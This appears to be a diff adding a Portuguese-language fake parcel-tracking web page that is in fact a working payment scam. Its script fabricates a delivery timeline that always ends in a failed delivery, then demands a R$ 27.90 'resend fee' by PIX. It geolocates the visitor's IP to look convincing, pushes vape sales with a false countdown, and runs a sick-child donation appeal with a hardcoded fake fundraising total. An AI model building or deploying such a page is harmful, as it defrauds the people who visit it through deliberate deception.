@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Rastreamento de Encomenda</title>
+<style>
+  :root{--blue:#0b57d0;--blue-d:#08388a;--blue-l:#e8f0fe;--gray:#7a7f87;--dark:#2f3640}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:Arial,Helvetica,sans-serif;background:#eef2f7;color:var(--dark)}
+  .wrap{max-width:960px;margin:0 auto;padding:0 12px 90px}
+  .brand{display:flex;flex-direction:column;align-items:center;padding:22px 0 6px}
+  .brand img{width:220px;height:220px;max-width:70%;aspect-ratio:1;border-radius:50%;object-fit:cover;display:block;border:4px solid var(--blue);box-shadow:0 6px 18px rgba(11,87,208,.3)}
+  .bubble{position:relative;background:var(--blue);color:#fff;font-weight:bold;font-size:15px;letter-spacing:.5px;padding:10px 20px;border-radius:24px;margin-bottom:16px;text-align:center;box-shadow:0 4px 12px rgba(11,87,208,.3);animation:float 3s ease-in-out infinite}
+  .bubble::after{content:"";position:absolute;left:50%;bottom:-10px;transform:translateX(-50%);border:10px solid transparent;border-bottom:0;border-top-color:var(--blue)}
+  @keyframes float{50%{transform:translateY(-4px)}}
+  .topbar{background:var(--blue);color:#fff;padding:18px 20px;margin-top:12px}
+  .topbar h3{font-size:14px;letter-spacing:.5px;margin-bottom:10px}
+  .search{display:flex;gap:12px;flex-wrap:wrap}
+  .search input{flex:1;min-width:200px;padding:10px;border:0;font-size:14px}
+  .search button{background:var(--blue-d);color:#fff;border:0;padding:10px 28px;font-size:17px;cursor:pointer}
+  .search button:hover{background:#06296a}
+  .title{background:var(--blue);color:#fff;text-align:center;font-size:20px;padding:14px;margin-top:16px}
+  .bar{text-align:center;font-size:18px;padding:14px;color:#fff;margin-top:16px}
+  .bar.gray{background:var(--gray)} .bar.dark{background:var(--dark)}
+  .status{background:#fff;text-align:center;padding:16px;font-size:22px;font-weight:bold}
+  .card{background:#fff;padding:16px}
+  .remessa{background:#dde3ea;text-align:center;font-size:20px;padding:14px;margin-bottom:10px}
+  .timeline{padding:20px 10px 10px}
+  .step{display:flex;gap:24px;align-items:center;position:relative;padding:14px 0;opacity:0;transform:translateY(10px);animation:in .5s forwards}
+  .step:not(:last-child)::after{content:"";position:absolute;left:39px;top:calc(50% + 40px);height:calc(100% - 20px);width:3px;background:var(--blue)}
+  .icon{flex:0 0 80px;height:80px;border-radius:50%;background:var(--blue);display:grid;place-items:center;z-index:1}
+  .icon svg{width:42px;height:42px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .step p{font-size:16px;line-height:1.4}
+  .step small{color:var(--gray);display:block;margin-top:6px;color:#2b6fd6}
+  .route-error{align-items:flex-start}
+  .route-error .icon{background:var(--blue)}
+  .route-error .step-copy{flex:1;min-width:0}
+  .route-error .step-copy p{color:var(--blue-d);font-weight:bold}
+  .fix-route{margin-top:10px;background:var(--blue);color:#fff;border:0;border-radius:6px;padding:10px 16px;font-size:14px;font-weight:bold;cursor:pointer}
+  .fix-route:hover,.modal-action:hover{background:var(--blue-d)}
+  .modal-backdrop{position:fixed;inset:0;z-index:10;background:rgba(20,34,55,.62);display:grid;place-items:center;padding:18px}
+  .modal{width:min(100%,440px);background:#fff;border-radius:12px;padding:24px;box-shadow:0 14px 40px rgba(0,0,0,.28)}
+  .modal h2{color:var(--blue-d);font-size:21px;margin-bottom:12px}
+  .modal p{font-size:15px;line-height:1.55;margin-bottom:12px}
+  .modal-note{background:var(--blue-l);color:var(--blue-d);padding:12px;border-radius:7px;font-weight:bold}
+  .demo-resend-notice{margin:16px 0 0!important;padding:12px;border:1px solid #9bbcf2;border-radius:7px;background:#edf4ff;color:var(--blue-d);font-weight:bold;text-align:center}
+  .address-form{display:grid;gap:12px;margin-top:16px}
+  .address-form label{display:grid;gap:6px;font-size:14px;font-weight:bold}
+  .address-form input{width:100%;padding:11px;border:1px solid #aab5c4;border-radius:6px;font:inherit}
+  .modal-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px}
+  .modal-demo-pix{width:100%;margin-top:14px;border:0;border-radius:6px;padding:12px;background:var(--blue);color:#fff;font-size:14px;font-weight:bold;cursor:pointer}
+  .modal-demo-pix:hover{background:var(--blue-d)}
+  .modal-action,.modal-close{flex:1;min-width:150px;border:0;border-radius:6px;padding:12px;font-size:14px;font-weight:bold;cursor:pointer}
+  .modal-action{background:var(--blue);color:#fff}
+  .modal-close{background:#e8edf4;color:var(--dark)}
+  .modal-close:hover{background:#d8e0eb}
+  body.modal-open{overflow:hidden}
+  @keyframes in{to{opacity:1;transform:none}}
+  .upsell h2{text-align:center;font-size:20px;color:var(--blue-d);margin-bottom:6px}
+  .upsell .sub{text-align:center;color:var(--gray);margin-bottom:18px;font-size:14px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .prod{border:2px solid var(--blue-l);border-radius:10px;padding:14px;text-align:center;position:relative}
+  .prod .tag{position:absolute;top:-10px;left:12px;background:var(--blue);color:#fff;font-size:11px;padding:3px 8px;border-radius:10px}
+  .prod .img{width:100%;aspect-ratio:1;border-radius:8px;overflow:hidden;background:linear-gradient(135deg,var(--blue-l),#c7dbff);margin-bottom:10px}
+  .prod .img img{display:block;width:100%;height:100%;object-fit:cover}
+  .prod h4{font-size:16px;margin-bottom:6px}
+  .prod p{font-size:13px;color:var(--gray);margin-bottom:10px;min-height:36px}
+  .old{text-decoration:line-through;color:var(--gray);font-size:13px}
+  .price{font-size:24px;font-weight:bold;color:var(--blue);margin:2px 0 10px}
+  .cost{font-size:11px;font-weight:bold;color:#c0392b;letter-spacing:.3px;margin:-4px 0 12px}
+  .prod button{width:100%;background:var(--blue);color:#fff;border:0;padding:12px;font-size:15px;border-radius:6px;cursor:pointer}
+  .prod button:hover{background:var(--blue-d)}
+  .prod button.added{background:#1a9b4b}
+  .bar.blue{background:var(--blue-d)}
+  .eta{text-align:center;background:var(--blue-l);color:var(--blue-d);padding:10px;font-size:15px;border-radius:6px}
+  .step.pending{opacity:.45!important;filter:grayscale(.6)}
+  .countdown{margin:0 auto 22px;max-width:420px;text-align:center;background:linear-gradient(135deg,var(--blue-d),var(--blue));color:#fff;border-radius:14px;padding:18px 16px;box-shadow:0 6px 18px rgba(11,87,208,.35)}
+  .alert-red{max-width:420px;margin:-8px auto 22px;background:#d62828;color:#fff;font-weight:bold;font-size:14px;text-align:center;padding:12px 14px;border-radius:8px;letter-spacing:.3px;box-shadow:0 4px 12px rgba(214,40,40,.35);animation:pulse 1.6s ease-in-out infinite}
+  @keyframes pulse{50%{box-shadow:0 0 0 6px rgba(214,40,40,.18)}}
+  .cd-label{font-size:14px;letter-spacing:.5px;margin-bottom:10px;opacity:.95}
+  .cd-digits{display:flex;justify-content:center;align-items:center;gap:10px}
+  .cd-box{background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.3);border-radius:10px;min-width:110px;padding:10px 8px}
+  .cd-box b{display:block;font-size:52px;line-height:1;font-variant-numeric:tabular-nums}
+  .cd-box span{font-size:11px;text-transform:uppercase;opacity:.85}
+  .cd-sep{font-size:44px;font-weight:bold;animation:blink 1s infinite}
+  .cd-bar{height:6px;background:rgba(255,255,255,.25);border-radius:3px;margin-top:14px;overflow:hidden}
+  .cd-bar i{display:block;height:100%;background:#fff;width:100%;transition:width 1s linear}
+  @keyframes blink{50%{opacity:.3}}
+  .fab{position:fixed;right:18px;bottom:18px;width:60px;height:60px;border-radius:50%;background:var(--blue);display:grid;place-items:center;box-shadow:0 4px 12px rgba(0,0,0,.3);cursor:pointer;border:0}
+  .fab svg{width:28px;height:28px;fill:#fff}
+  .hidden{display:none}
+  .toast{position:fixed;left:50%;bottom:90px;transform:translateX(-50%);background:var(--dark);color:#fff;padding:10px 18px;border-radius:6px;font-size:14px;display:none}
+  @media(max-width:640px){.grid{grid-template-columns:1fr}.step p{font-size:14px}.icon{flex-basis:64px;height:64px}.step:not(:last-child)::after{left:31px}.status{font-size:18px}}
+  @media(min-width:900px){.step p{font-size:18px}.title{font-size:24px}.timeline{padding:30px 60px}}
+  .donate{text-align:center}
+  .don-img{height:220px;border-radius:12px;overflow:hidden;background:linear-gradient(135deg,var(--blue-l),#c7dbff);display:grid;place-items:center;font-size:80px;margin-bottom:16px;position:relative}
+  .don-img img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+  .donate h2{color:var(--blue-d);font-size:22px;margin-bottom:10px}
+  .don-txt{color:#555;line-height:1.5;max-width:620px;margin:0 auto 18px;font-size:15px}
+  .don-btns{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:520px;margin:0 auto}
+  .don-btns button{padding:14px 6px;font-size:17px;font-weight:bold;border:2px solid var(--blue);background:#fff;color:var(--blue);border-radius:8px;cursor:pointer;transition:.15s}
+  .don-btns button:hover{background:var(--blue-l)}
+  .don-btns button.sel{background:var(--blue);color:#fff}
+  .don-btns .other{grid-column:1/-1;font-size:15px}
+  .don-custom{display:flex;align-items:center;gap:8px;max-width:520px;margin:12px auto 0;border:2px solid var(--blue);border-radius:8px;padding:4px 12px}
+  .don-custom span{font-weight:bold;color:var(--blue)}
+  .don-custom input{flex:1;border:0;outline:0;font-size:18px;padding:8px 0}
+  .don-go{display:block;width:100%;max-width:520px;margin:16px auto 0;padding:15px;background:var(--blue-d);color:#fff;border:0;border-radius:8px;font-size:17px;cursor:pointer}
+  .don-go:disabled{background:#a9b4c6;cursor:not-allowed}
+  .don-pix-result{max-width:520px;margin:16px auto 0;padding:16px;border:1px solid #c9d8ef;border-radius:8px;background:#f7faff;text-align:center}
+  .don-pix-result img{display:block;width:min(240px,100%);height:auto;margin:12px auto}
+  .pix-copy{width:100%;max-height:90px;resize:none;border:1px solid #c5cbd3;border-radius:6px;padding:10px;font-size:12px;line-break:anywhere}
+  .pix-copy-button{width:100%;margin-top:8px;padding:12px;border:0;border-radius:6px;background:var(--blue);color:#fff;font-weight:bold;cursor:pointer}
+  .don-pix-status{font-size:14px;color:#555;margin-top:10px}
+  .goal{max-width:520px;margin:0 auto 20px;text-align:left}
+  .goal-top{display:flex;justify-content:space-between;gap:8px;font-size:14px;color:var(--dark);margin-bottom:8px;flex-wrap:wrap}
+  .goal-top b{color:var(--blue-d)}
+  .goal-bar{height:22px;background:var(--blue-l);border-radius:11px;overflow:hidden}
+  .goal-bar i{display:block;height:100%;width:0;border-radius:11px;background:linear-gradient(90deg,var(--blue),#4a90ff);transition:width 1.2s ease}
+  .goal-pct{text-align:right;font-size:13px;color:var(--gray);margin-top:4px}
+  .don-err{color:#c0392b;font-size:13px;margin-top:8px}
+  .demo-notice{background:#fff3cd;color:#664d03;border:2px solid #ffda6a;border-radius:8px;padding:14px 16px;margin:12px 0;text-align:center;font-weight:bold;line-height:1.5}
+  @media(max-width:640px){.don-img{height:170px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand">
+    <div class="bubble">ENTREGA RÁPIDA A GENTE ENTENDE</div>
+    <img src="fotolgoo.png" alt="Logo">
+  </div>
+
+  <div class="demo-notice" role="note">
+    SALVE O LINK DESTE SITE PARA ACOMPANHAR SUA ENCOMENDA.
+  </div>
+
+  <div class="topbar">
+    <h3>RASTREIE SUA ENCOMENDA</h3>
+    <form class="search" id="form">
+      <input id="code" placeholder="CPF, CNPJ OU CÓDIGO DE RASTREIO" value="26717273636261" readonly>
+      <button type="button" disabled style="cursor:default">Procurar</button>
+    </form>
+  </div>
+
+  <div class="title" id="ttl">RASTREAMENTO DE ENCOMENDA</div>
+
+  <div id="result">
+    <div class="bar blue hidden" id="closed">Oferta encerrada · válida apenas durante a separação do pedido</div>
+    <div id="offer">
+    <div class="bar blue">Aproveite antes que acabe</div>
+    <div class="card upsell">
+      <h2>Compre junto e economize no mesmo frete</h2>
+      <p class="sub">Oferta válida apenas durante o processo de separação do pedido.</p>
+      <div class="countdown">
+        <div class="cd-label">⏱ A separação termina e a oferta expira em</div>
+        <div class="cd-digits">
+          <div class="cd-box"><b id="cm">15</b><span>minutos</span></div>
+          <div class="cd-sep">:</div>
+          <div class="cd-box"><b id="cs">00</b><span>segundos</span></div>
+        </div>
+        <div class="cd-bar"><i id="cbar"></i></div>
+      </div>
+      <div class="alert-red">⚠️ OFERTA VÁLIDA SOMENTE NO PERÍODO DE SEPARAÇÃO</div>
+      <div class="grid">
+        <div class="prod">
+          <span class="tag">MAIS VENDIDO</span>
+          <div class="img"><img src="fone-bluetooth-500.svg" alt="Ilustração do Fone Bluetooth Pro, imagem quadrada 500 por 500"></div>
+          <h4>ELFBAR V40 4.000 PUFFS</h4>
+          <p>SABOR SORTIDO - PREÇO DE CUSTO SÓ PRA VOCÊ</p>
+          <div class="old">De R$ 34,90 por</div>
+          <div class="price">R$ 17,77</div>
+          <div class="cost">PREÇO DE CUSTO SOMENTE PARA VOCÊ</div>
+          <button data-n="ELFBAR V40 4.000 PUFFS">GERAR PIX</button>
+        </div>
+        <div class="prod">
+          <span class="tag">OFERTA RELÂMPAGO</span>
+          <div class="img"><img src="smartwatch-fit-500.svg" alt="Ilustração do Smartwatch Fit Plus, imagem quadrada 500 por 500"></div>
+          <h4>ELFBAR V80 8000 PUFFS</h4>
+          <p>SABOR SORTIDO - PREÇO DE CUSTO SÓ PRA VOCÊ</p>
+          <div class="old">De R$ 55,30 por</div>
+          <div class="price">R$ 27,31</div>
+          <div class="cost">PREÇO DE CUSTO SOMENTE PARA VOCÊ</div>
+          <button data-n="ELFBAR V80 8000 PUFFS">GERAR PIX</button>
+        </div>
+      </div>
+    </div>
+    </div>
+
+    <div class="bar gray">Resultados da busca</div>
+    <div class="status">Status referente à consulta:<br><span id="q"></span></div>
+    <div class="bar dark">Remessa</div>
+    <div class="card">
+      <div class="remessa" id="rem">PEDIDO#7281</div>
+      <div class="eta" id="eta"></div>
+      <div class="timeline" id="tl"></div>
+    </div>
+
+    <div class="bar blue">Ajude quem mais precisa</div>
+    <div class="card donate">
+      <div class="don-img"><img src="pedroprecisa.png" alt="Campanha de doação" onerror="this.remove()"><span>💙</span></div>
+      <h2>Faça parte dessa corrente do bem e te recompensaremos com um brinde surpresa 🎁</h2>
+      <p class="don-txt">Pedro é apenas uma criança, mas enfrenta uma batalha enorme contra uma grave cardiopatia congênita. Internado e precisando de uma cirurgia urgente, ele foi abandonado pelos próprios pais e enfrenta esse momento tão difícil sem o carinho da família. Sensibilizados com sua história, os donos da VPNacional decidiram ajudar. Sua doação pode contribuir para a cirurgia e dar ao pequeno Pedro uma nova chance de viver. ❤️</p>
+            <div class="goal">
+              <div class="goal-top"><span>Já arrecadamos <b id="gRaised"></b></span><span>Meta: <b>R$ 75.000,00</b></span></div>
+              <div class="goal-bar"><i id="gBar"></i></div>
+              <div class="goal-pct" id="gPct"></div>
+            </div>
+            <div class="don-btns" id="donBtns">
+        <button data-v="7.9">R$ 7,90</button><button data-v="10">R$ 10</button><button data-v="15">R$ 15</button>
+        <button data-v="20">R$ 20</button><button data-v="30">R$ 30</button><button data-v="50">R$ 50</button>
+        <button data-v="outro" class="other">Outro valor</button>
+      </div>
+      <div class="don-custom hidden" id="donCustom">
+        <span>R$</span><input id="donVal" type="number" min="7.9" max="350" step="0.01" placeholder="Digite o valor (R$ 7,90 a R$ 350,00)">
+      </div>
+              <div class="don-err hidden" id="donErr">Informe um valor entre R$ 7,90 e R$ 350,00.</div>
+      <button class="don-go" id="donGo" disabled>Selecione um valor</button>
+      <div class="don-pix-result hidden" id="donPixResult">
+        <div class="don-pix-status" id="donPixStatus">Gerando PIX...</div>
+        <img id="donPixQr" class="hidden" alt="QR Code do PIX">
+        <textarea id="donPixCode" class="pix-copy hidden" readonly aria-label="Código PIX Copia e Cola"></textarea>
+        <button id="donPixCopy" class="pix-copy-button hidden" type="button">COPIAR PIX</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<button class="fab" aria-label="Chat"><svg viewBox="0 0 24 24"><path d="M4 4h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H9l-5 4v-4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/></svg></button>
+<div class="toast" id="toast"></div>
+<div class="modal-backdrop hidden" id="routeModal" role="presentation">
+  <section class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDescription">
+    <h2 id="modalTitle">SERÁ NECESSÁRIO FAZER UM REENVIO</h2>
+    <p id="modalDescription">Ocorreu um problema com a entrega do seu pedido e será necessário reenviá-lo. o entregador esperou no seu endereço, mas você não apareceu, será necessário pagar a taxa de reenvio para receber sua encomenda.</p>
+    <p class="modal-note">O entregador esperou no seu endereço por 2 horas, mas você não apareceu.</p>
+    <div class="address-form hidden" aria-hidden="true"></div>
+    <p class="demo-resend-notice" id="pixPaymentNotice">Gere o PIX da taxa de reenvio informada.</p>
+    <button class="modal-demo-pix" id="demoPix" type="button">GERAR PIX</button>
+    <div class="modal-actions">
+      <button class="modal-close" id="closeModal" type="button">Fechar</button>
+    </div>
+  </section>
+</div>
+
+<script>
+const I={
+  list:'<path d="M9 6h11M9 12h11M9 18h11"/><path d="M3.5 6l1 1 2-2M3.5 12l1 1 2-2M3.5 18l1 1 2-2"/>',
+  box:'<path d="M3 8l9-5 9 5v8l-9 5-9-5z"/><path d="M3 8l9 5 9-5M12 13v8"/>',
+  hand:'<rect x="3" y="7" width="18" height="12" rx="2"/><path d="M7 11h10M7 15h6"/>',
+  truck:'<path d="M2 6h11v10H2zM13 9h5l3 3v4h-8"/><circle cx="7" cy="18" r="2"/><circle cx="17" cy="18" r="2"/>',
+  pin:'<path d="M12 22s7-7 7-12a7 7 0 0 0-14 0c0 5 7 12 7 12z"/><circle cx="12" cy="10" r="3"/>',
+  home:'<path d="M3 11l9-8 9 8M5 10v10h14V10M9 20v-6h6v6"/>'
+};
+const p2=n=>String(n).padStart(2,'0');
+const fmt=x=>`${p2(x.getDate())}/${p2(x.getMonth()+1)}/${x.getFullYear()} - ${p2(x.getHours())}:${p2(x.getMinutes())}`;
+const fmtD=x=>`${p2(x.getDate())}/${p2(x.getMonth()+1)}/${x.getFullYear()}`;
+// Dias úteis: fim de semana empurra o evento para segunda-feira
+const biz=x=>{x=new Date(x);const w=x.getDay();if(w===6)x.setDate(x.getDate()+2);else if(w===0)x.setDate(x.getDate()+1);else return x;x.setHours(8,30,0,0);return x};
+// [ícone, texto, horas após o pedido, minutos extras]
+const steps=[
+  ['list','Seu pedido está em separação.',0,0],
+  ['box','Seu pedido foi postado e já está com a transportadora.',0,30],
+  ['hand','Seu produto foi coletado no ponto de apoio e já está com a transportadora.',4,17],
+  ['truck','Seu produto está em transferência interna para a unidade de destino.',19,42],
+  ['truck','Seu produto chegou à unidade de destino{c}.',32,5],
+  ['pin','Seu produto saiu para entrega{c} e está a caminho do seu endereço.',40,28],
+  ['pin','O entregador não conseguiu localizar o endereço. Revise o endereço.',46,50]
+];
+const TOTAL=1800;
+let userCity='';
+let key='',timer=null;
+function render(){
+  const start=new Date(+localStorage.getItem('ord_'+key));
+  const now=new Date();
+  const ev=steps.map((s,i)=>({s,t:i<2?new Date(start.getTime()+(s[2]*60+s[3])*60000):biz(new Date(start.getTime()+(s[2]*60+s[3])*60000))}));
+  // garante ordem crescente após ajuste de fim de semana
+  for(let i=1;i<ev.length;i++)if(ev[i].t<=ev[i-1].t)ev[i].t=new Date(ev[i-1].t.getTime()+(40+i*7)*60000);
+  const tl=document.getElementById('tl');tl.innerHTML='';
+  let done=0;
+  let routeErrorReached=false;
+  ev.forEach((e,i)=>{
+    const reached=e.t<=now;if(reached)done++;
+    const isRouteError=i===steps.length-1;
+    if(isRouteError&&reached)routeErrorReached=true;
+    if(isRouteError&&!reached)return;
+    const el=document.createElement('div');el.className='step'+(reached?'':' pending')+(isRouteError?' route-error':'');el.style.animationDelay=i*.15+'s';
+    el.innerHTML=`<div class="icon"><svg viewBox="0 0 24 24">${I[e.s[0]]}</svg></div><div class="step-copy"><p>${e.s[1].replace('{c}',userCity?' em '+userCity:'')}</p><small>${reached?fmt(e.t):'Previsto para '+fmtD(e.t)}</small></div>`;
+    if(isRouteError&&reached){
+      const button=document.createElement('button');
+      button.className='fix-route';button.type='button';button.textContent='Corrigir erro';
+      button.setAttribute('aria-haspopup','dialog');button.setAttribute('aria-controls','routeModal');
+      button.addEventListener('click',()=>{
+        pendingPayment={amount:2790,description:'Taxa de reenvio da encomenda'};
+        document.getElementById('pixPaymentNotice').textContent='Pagamento de R$ 27,90 referente à taxa de reenvio.';
+        openRouteModal();
+      });
+      el.querySelector('.step-copy').appendChild(button);
+    }
+    tl.appendChild(el);
+  });
+  const last=ev[ev.length-1].t;
+  document.getElementById('eta').innerHTML=last<=now
+    ?'SEU PEDIDO SERÁ ENTREGUE NA VELOCIDADE DA LUZ.'
+    :done===ev.length
+    ?'✔ Entregue em <b>'+fmt(last)+'</b>'
+    :'Prazo de entrega: <b>2 dias úteis</b> · Previsão: <b>'+fmtD(last)+'</b>';
+  const modalShownKey='route-error-shown_'+key;
+  if(routeErrorReached&&!localStorage.getItem(modalShownKey)){
+    localStorage.setItem(modalShownKey,'1');
+    openRouteModal();
+  }
+}
+function search(){
+  const v=document.getElementById('code').value.trim()||'26717273636261';
+  key=v.replace(/\D/g,'')||v;
+  if(!localStorage.getItem('ord_'+key))localStorage.setItem('ord_'+key,Date.now());
+  document.getElementById('q').textContent=v;
+  document.getElementById('rem').textContent='PEDIDO#7281';
+  render();tick();clearInterval(timer);timer=setInterval(render,30000);
+}
+document.getElementById('form').onsubmit=e=>e.preventDefault();
+const routeModal=document.getElementById('routeModal');
+function openRouteModal(){routeModal.classList.remove('hidden');document.body.classList.add('modal-open');document.getElementById('closeModal').focus()}
+function closeRouteModal(){routeModal.classList.add('hidden');document.body.classList.remove('modal-open')}
+document.getElementById('closeModal').addEventListener('click',closeRouteModal);
+routeModal.addEventListener('click',e=>{if(e.target===routeModal)closeRouteModal()});
+document.addEventListener('keydown',e=>{if(e.key==='Escape'&&!routeModal.classList.contains('hidden'))closeRouteModal()});
+let pendingPayment = null;
+async function createPix(amount, description) {
+  const button=document.getElementById('demoPix');
+  button.disabled=true;
+  button.textContent='GERANDO PIX...';
+  try {
+    const response=await fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount,description,offer_link:location.href})});
+    const result=await response.json();
+    if(!response.ok)throw new Error(result.error||'Não foi possível gerar o PIX.');
+    const code=result.qr_code||'';
+    const output=document.createElement('div');
+    output.style.cssText='margin-top:14px;background:#eef4ff;border-radius:6px;padding:12px;font-size:13px;word-break:break-all';
+    output.innerHTML='<b>PIX gerado</b><br><small>'+code+'</small>'; 
+    if(result.qr_code_base64){output.innerHTML+='<img alt="QR Code PIX" src="'+result.qr_code_base64+'" style="display:block;max-width:220px;width:100%;margin:12px auto 0">';}
+    document.querySelector('#routeModal .modal').appendChild(output);
+    button.textContent='PIX GERADO';
+  } catch(error) {
+    alert(error.message);
+    button.textContent='TENTAR NOVAMENTE';
+    button.disabled=false;
+  }
+}
+document.getElementById('demoPix').addEventListener('click',()=>{
+  if(!pendingPayment){alert('Selecione um valor antes de gerar o PIX.');return}
+  createPix(pendingPayment.amount,pendingPayment.description);
+});
+search();
+document.querySelectorAll('.prod button').forEach((b,index)=>b.onclick=()=>{
+  pendingPayment={amount:index===0?1777:2731,description:b.dataset.n};
+  document.getElementById('pixPaymentNotice').textContent='Pagamento real de '+(index===0?'R$ 17,77':'R$ 27,31')+'.';
+  openRouteModal();
+});
+function tick(){
+  const box=document.getElementById('offer');
+  if(!key)return;
+  const s=Math.round((+localStorage.getItem('ord_'+key)+TOTAL*1000-Date.now())/1000);
+  box.classList.toggle('hidden',s<=0);
+  document.getElementById('closed').classList.toggle('hidden',s>0);
+  if(s<=0)return;
+  document.getElementById('cm').textContent=p2(Math.floor(s/60));
+  document.getElementById('cs').textContent=p2(s%60);
+  document.getElementById('cbar').style.width=(s/TOTAL*100)+'%';
+}
+setInterval(tick,1000);tick();
+
+// Cidade pelo IP, testando vários serviços em sequência; se todos falharem, mantém o título padrão
+function setCity(c){userCity=c;document.getElementById('ttl').textContent='RASTREAMENTO DE ENCOMENDA PARA '+c.toUpperCase();render()}
+const geoAPIs=[
+  ['https://ipapi.co/json/',j=>j.city],
+  ['https://get.geojs.io/v1/ip/geo.json',j=>j.city],
+  ['https://ipwho.is/',j=>j.success!==false&&j.city]
+];
+(async()=>{
+  for(const [u,get] of geoAPIs){
+    try{
+      const j=await (await fetch(u)).json();
+      const c=get(j);
+      if(c){setCity(c);return}
+    }catch(e){}
+  }
+})();
+// Doação
+let donValue=0;
+const donGo=document.getElementById('donGo'),donVal=document.getElementById('donVal'),donCustom=document.getElementById('donCustom');
+const brl=n=>'R$ '+n.toFixed(2).replace('.',',');
+const DON_MIN=7.9,DON_MAX=350;
+function donUpdate(){
+  const custom=!donCustom.classList.contains('hidden');
+  const bad=custom&&donVal.value!==''&&(donValue<DON_MIN||donValue>DON_MAX);
+  document.getElementById('donErr').classList.toggle('hidden',!bad);
+  const ok=donValue>=DON_MIN&&donValue<=DON_MAX;
+  donGo.disabled=!ok;
+  donGo.textContent=ok?'Gerar PIX de '+brl(donValue):'Selecione um valor';
+}
+document.querySelectorAll('#donBtns button').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('#donBtns button').forEach(x=>x.classList.remove('sel'));
+  b.classList.add('sel');
+  if(b.dataset.v==='outro'){donCustom.classList.remove('hidden');donVal.focus();donValue=parseFloat(donVal.value)||0}
+  else{donCustom.classList.add('hidden');donValue=+b.dataset.v}
+  donUpdate();
+});
+donVal.oninput=()=>{donValue=parseFloat(donVal.value)||0;donUpdate()};
+// Meta de arrecadação (ajuste GOAL_RAISED para o valor já doado)
+const GOAL=75000;let raised=52340;
+function goalRender(){
+  document.getElementById('gRaised').textContent=raised.toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
+  const pct=Math.min(100,raised/GOAL*100);
+  document.getElementById('gBar').style.width=pct+'%';
+  document.getElementById('gPct').textContent=pct.toFixed(1).replace('.',',')+'% da meta';
+}
+setTimeout(goalRender,100);
+donGo.onclick=async()=>{
+  const cents=Math.round(donValue*100);
+  const resultBox=document.getElementById('donPixResult');
+  const qr=document.getElementById('donPixQr');
+  const code=document.getElementById('donPixCode');
+  const copy=document.getElementById('donPixCopy');
+  resultBox.classList.remove('hidden');
+  document.getElementById('donPixStatus').textContent='Gerando PIX de '+brl(donValue)+'...';
+  qr.classList.add('hidden');
+  code.classList.add('hidden');
+  copy.classList.add('hidden');
+  donGo.disabled=true;
+  try{
+    const response=await fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:cents,description:'Doação voluntária',offer_link:location.href})});
+    const result=await response.json();
+    if(!response.ok)throw new Error(result.error||'Não foi possível gerar o PIX.');
+    const pixCode=result.qr_code||result.pix_code||result.copy_paste||'';
+    if(!pixCode)throw new Error('O provedor não retornou o código PIX.');
+    document.getElementById('donPixStatus').textContent='PIX gerado para '+brl(donValue)+'. Pague usando o QR Code ou o código abaixo.';
+    if(result.qr_code_base64){qr.src=result.qr_code_base64;qr.classList.remove('hidden')} else {qr.classList.add('hidden')}
+    code.value=pixCode;code.classList.remove('hidden');copy.classList.remove('hidden');
+    copy.onclick=async()=>{
+      await navigator.clipboard.writeText(pixCode);
+      copy.textContent='PIX COPIADO';
+      setTimeout(()=>copy.textContent='COPIAR PIX',2000);
+    };
+  }catch(error){
+    document.getElementById('donPixStatus').textContent=error.message;
+  }finally{donGo.disabled=false}
+};
+</script>
+</body>
+</html>
